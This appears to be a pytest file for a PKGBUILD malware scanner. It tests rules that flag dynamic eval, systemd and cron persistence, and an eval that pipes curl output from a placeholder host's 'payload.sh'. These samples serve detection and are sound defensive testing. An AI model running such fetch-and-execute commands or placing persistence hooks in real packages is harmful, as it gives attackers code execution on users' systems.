from aurascan.analyzers.deterministic import DeterministicAnalyzer
from aurascan.core.models import Phase, Severity


def analyze_text(text: str, phase=Phase.pkgbuild_static):
    return DeterministicAnalyzer().analyze_content("PKGBUILD", text, phase)


def rule_ids(findings):
    return {finding.rule_id for finding in findings}


def finding(findings, rule_id):
    return next(item for item in findings if item.rule_id == rule_id)


def test_eval_chain_detects_dynamic_eval_pattern():
    findings = analyze_text('build() {\n  eval "$generated_command"\n}\n')

    assert "EXEC-EVAL-001" in rule_ids(findings)
    eval_finding = finding(findings, "EXEC-EVAL-001")
    assert eval_finding.severity == Severity.HIGH
    assert eval_finding.requires_manual_review is True
    assert eval_finding.blocks_installation is False


def test_eval_comment_does_not_trigger():
    findings = analyze_text("# eval \"$(curl https://example.invalid/payload.sh)\"\n")

    assert "EXEC-EVAL-001" not in rule_ids(findings)
    assert "EXEC-EVAL-NET-001" not in rule_ids(findings)


def test_eval_network_decode_combo_is_blocking():
    findings = analyze_text("build() {\n  eval \"$(curl https://example.invalid/payload.sh)\"\n}\n")

    assert "EXEC-EVAL-NET-001" in rule_ids(findings)
    combo = finding(findings, "EXEC-EVAL-NET-001")
    assert combo.severity == Severity.CRITICAL
    assert combo.blocks_installation is True


def test_systemd_service_file_install_is_lower_severity_than_auto_enable():
    findings = analyze_text('package() {\n  install -Dm644 demo.service "$pkgdir/usr/lib/systemd/system/demo.service"\n}\n')

    assert "SYS-SYSTEMD-UNIT-001" in rule_ids(findings)
    unit = finding(findings, "SYS-SYSTEMD-UNIT-001")
    assert unit.severity == Severity.MEDIUM
    assert unit.blocks_installation is False


def test_systemd_enable_in_install_hook_requires_review():
    findings = analyze_text("post_install() {\n  systemctl enable demo.service\n}\n", Phase.install_hook_static)

    assert "SYS-SYSTEMD-AUTO-001" in rule_ids(findings)
    auto = finding(findings, "SYS-SYSTEMD-AUTO-001")
    assert auto.severity == Severity.HIGH
    assert auto.requires_manual_review is True


def test_systemd_user_service_persistence_detected():
    findings = analyze_text('package() {\n  install -Dm644 demo.service "$HOME/.config/systemd/user/demo.service"\n}\n')

    assert "SYS-SYSTEMD-USER-001" in rule_ids(findings)


def test_cron_file_install_detected():
    findings = analyze_text('package() {\n  install -Dm644 fixture.cron "$pkgdir/etc/cron.d/fixture"\n}\n')

    assert "SYS-CRON-FILE-001" in rule_ids(findings)


def test_crontab_command_detected():
    findings = analyze_text("post_install() {\n  crontab - <<'EOF'\n}\n", Phase.install_hook_static)

    assert "SYS-CRONTAB-001" in rule_ids(findings)


def test_cron_reboot_entry_detected():
    findings = analyze_text("post_install() {\n  printf '@reboot echo fixture\\n' > /tmp/fixture-cron\n}\n", Phase.install_hook_static)

    assert "SYS-CRON-REBOOT-001" in rule_ids(findings)


def test_trailing_comment_is_not_scanned():
    findings = analyze_text("pkgdesc='demo' # systemctl enable demo.service\n")

    assert "SYS-SYSTEMD-AUTO-001" not in rule_ids(findings)
